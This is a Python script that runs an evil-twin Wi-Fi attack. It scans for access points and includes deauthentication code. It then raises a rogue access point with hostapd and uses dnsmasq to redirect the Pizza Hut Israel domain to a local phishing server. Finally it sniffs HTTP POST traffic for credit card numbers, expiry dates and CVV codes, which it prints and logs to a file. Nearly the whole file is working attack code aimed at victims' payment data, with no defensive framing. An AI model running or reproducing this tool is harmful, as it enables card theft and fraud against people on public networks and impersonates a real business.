from _thread import start_new_thread
from colorama import init, Fore
from scapy.all import *
from prettytable import PrettyTable
from scapy.layers.dhcp import DHCP
from scapy.layers.dot11 import RadioTap, Dot11Deauth, Dot11, Dot11Beacon
import sys
import netifaces as ni
import os
from scapy.layers.http import HTTPRequest
import json

# wlan0 must be the better
# wlan 1 the other
# https://www.ionos.com/community/server-cloud-infrastructure/nodejs/set-up-a-nodejs-app-for-a-website-with-apache-on-ubuntu-1604/
# http://pizza-hack-node1.herokuapp.com/
from scapy.layers.inet import IP

aps_dict = {}
timeOut =100
pizzaHuckUrl = 'www.pizzahut.co.il'

# terminal colors
GREEN = Fore.GREEN
RED = Fore.RED
BLUE = Fore.BLUE
RESET = Fore.RESET
# end of terminal colors


#for print aps_dict as table, using 'PrettyTable' module
def printPretty():
    table = PrettyTable(['SSID', 'MAC ADRESS', 'BEACONS'])
    for ssid, mac_beacons in aps_dict.items():
        table.add_row([ssid, str(mac_beacons[0]), str(mac_beacons[1])])
    print(f'{GREEN}')
    print(table)


def getSSID():
    ssid = ""
    while not (ssid in aps_dict):
        ssid = input("Select SSID to hack \t")
    return ssid


def disconnect_all(gateway_mac, interface):
    makeMonitorMode(interface)
    target_mac = "ff:ff:ff:ff:ff:ff" # we disconnect all the users that connect to the target ap
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC- the choosen ap
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # Radio tap: layer that contains additional information about transmissions like channel...
    # dot11- IEE802.11
    # Dot11Deauth - contains reason field
    packet = RadioTap() / dot11 / Dot11Deauth()
    # send the packet
    while True:
        # inter- the time to wait between 2 packets
        sendp(packet, inter=0.00001, iface=interface, verbose=0)
'''
"g" simply means 2.4GHz band
channel- the channel to use
'''

def createRougeAp(ssid, interface):
    nameOfDir = "fakeap"
    nameConfFile = "%s/hostapd.conf" % (nameOfDir)
    channel = 6
    '''
        interface=  the interface that used for the new ap
        driver=nl80211 - iee802.11 
        ssid= name of the new ap
        hw_mode= g - "g" simply means 2.4GHz band
        channel= which channel to use
    '''
    text = 'interface=%s\ndriver=nl80211\nssid=%s\nhw_mode=g\nchannel=%d' % (
    interface, ssid, channel)
    os.system("mkdir -p %s" % (nameOfDir))
    writeFile(nameConfFile,text)
    os.system("sudo hostapd %s" % (nameConfFile))


def makeMonitorMode(interfaceName):
    print(f'{RED}Change %s to monitor mode' % (interfaceName))
    # shut down the interface -> change to monitor mode -> up the interface
    os.system('sudo ifconfig %s down' % (interfaceName))
    os.system('sudo iwconfig %s mode monitor' % (interfaceName))
    os.system('sudo ifconfig %s up' % (interfaceName))


def createDnsmasqHosts(apacheIP, url):
    nameOfHostsFile = 'dnsmasq.hosts'
    text = apacheIP+' '+url
    writeFile(nameOfHostsFile,text)



def provideDHCP(interface):
    '''
    interface=wlan0
    dhcp-range= Enable the DHCP server. Addresses will be given out from [firstAdd,endAdd], then the network mask, 12H the time for
    using the ip address.
    dhcp-option=3,192.168.1.1 - the gateway ip, the default ip to the router
    dhcp-option=6,192.168.1.1 - the dns server, the default ip to the router
    server=8.8.8.8 - this fowarding the dns request from 192.168.1.1 to google dns public server.
    listen-address= the address that dnsmasq will listen on.
    listen-address= the address that dnsmasq will listen on.
    addn-hosts=dnsmasq.hosts - add nsmasq.hosts file to hosts. hosts allow as to declare dns answer to specific url

    '''
    nameOfDir = "fakeap"
    nameConfFile = "%s/dnsmasq.conf" % (nameOfDir)
    ipRangeWithTTL = '192.168.1.2,192.168.1.30,255.255.255.0,12h'
    apIP = '192.168.1.1'
    dnsIP = apIP
    listenAddr = '127.0.0.1'
    netmask = '255.255.255.0'
    apacheIP = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr'] #the physics address of eth0
    # where the apache server exists

    text = 'interface=%s\ndhcp-range=%s\ndhcp-option=3,%s\n' \
           'dhcp-option=6,%s\nserver=8.8.8.8\nlisten-address=%s\n' \
           'listen-address=192.168.1.1\naddn-hosts=dnsmasq.hosts' \
           % (interface, ipRangeWithTTL, apIP, dnsIP, listenAddr)
    writeFile(nameConfFile,text)
    createDnsmasqHosts(apacheIP, pizzaHuckUrl)
    # set the ip of wlan0 to apIP and netmask of wlan0 to netmask value
    os.system('ifconfig %s up %s netmask %s' % (interface, apIP, netmask))
    # add routing table
    os.system('route add -net 192.168.1.0 netmask %s gw %s' % (netmask, apIP))
    # start dnsmasq with the config file
    os.system('dnsmasq -C %s -d' % (nameConfFile))


def fowardTraffic():
    # iptables is a firewall program for Linux. It will monitor traffic from and to your server using tables
    # fowards the traffic from wlan0 to eth0 - the network card of my leptop:
    # this command foward the postrouting - (after routing the ip) to eth0
    os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE')
    # accept all the packet from wlan0
    os.system('iptables --append FORWARD --in-interface wlan0 -j ACCEPT')
    # a flag for allowing fowarding
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


def sniffCreditCard(interface):
    print('listening.................')
    while True:
        sniff(filter="tcp port 80", prn=process_packet, iface=interface, store=False)


def process_packet(packet):
    # nameOfSite to filter only http request from this site
    nameOfSite = 'pizzahut'
    if packet.haslayer(HTTPRequest):
        # if this packet is an HTTP Request
        # get the requested URL
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        path = packet[HTTPRequest].Path.decode()
        if (nameOfSite in url and method == 'POST' and packet.haslayer(Raw)):
            # if has raw data, and the requested method is "POST"
            creditDetails = str(packet[Raw].load)
            if (creditDetails.find('credit')):
                # if data contains 'credit'
                # then show data
                creditData = json.loads(packet[Raw].load.decode('utf-8'))
                print(f"{BLUE}[!] Credit card details:\ncredit: {creditData['credit']}\ndate: {creditData['date']}\n3 nums: {creditData['three_num']}{RESET}")
                print(f"{RED}")
                writeFile('credits.log',packet[Raw].load.decode('utf-8')+'\n','a')
        # Http GET for get the site
        elif(nameOfSite in url and method == 'GET' and path == '/'):
            print(f"{GREEN}[!] {packet[IP].src} entered to phishing site!")
            print(f"{RESET}")

def writeFile(fName,text,mode='w'):
    f = open(fName, mode)
    f.write(text)
    f.close()


def sniffDHCPHandler(packet):
    # dhcp use udp, port 67(server), port 68(client)
    #dhcp ack- new connection [0][5] - ack on dhcp offer
    if DHCP in packet and packet[DHCP].options[0][1] == 5:
        print(f"{BLUE} [!] {packet[IP].dst} connected!")
        print(f"{RESET}")


def sniffDHCP(interface):
    while True:
        sniff(filter="udp and (port 67 or 68)", prn=sniffDHCPHandler, iface=interface)

def main():
    interfaceName = sys.argv[1]
    secondIterface = sys.argv[2] # for attack
    makeMonitorMode(interfaceName)
    print(f"{RED}Sniffing please wait...")
    sniff(prn=scanWifi, iface=interfaceName, count=timeOut)#iface - interface to sniff , prn - function
    printPretty()
    ssid = getSSID()
    print(f"{RED}Start deauthentication attack on "+ssid)

    #start_new_thread(disconnect_all,(aps_dict[ssid][0],secondIterface,))
    start_new_thread(createRougeAp,(ssid,interfaceName,))
    start_new_thread(fowardTraffic,())
    start_new_thread(provideDHCP,(interfaceName,))
    time.sleep(8)
    start_new_thread(sniffDHCP, (interfaceName,))
    sniffCreditCard(interfaceName)



def scanWifi(pkt):
    if pkt.haslayer(Dot11Beacon):  # check if the pkt is dot11
        # type- {Management, control, data, extension}, subtype:{Association Request, Association Response, Beacon, Deauthentification...}
        if pkt.type == 0 and pkt.subtype == 8:  # check if ( type 0-Management , 8 - Beacon)
            # dictionary[Key = ssid(name),Value = (mac of ap, sum of packets)]
            if not (pkt.info.decode("utf-8") in aps_dict):  # check if the ssid(name) not in the dict
                # SSID- ptk.info MAC- pkt.addr3
                aps_dict[pkt.info.decode("utf-8")] = (pkt.addr3, 1)
            else:
                numOfBeacons = aps_dict[pkt.info.decode("utf-8")][1]
                numOfBeacons += 1
                aps_dict[pkt.info.decode("utf-8")] = (pkt.addr3, numOfBeacons)
        else:
            pass
    else:
        pass


if __name__ == '__main__':
    main()
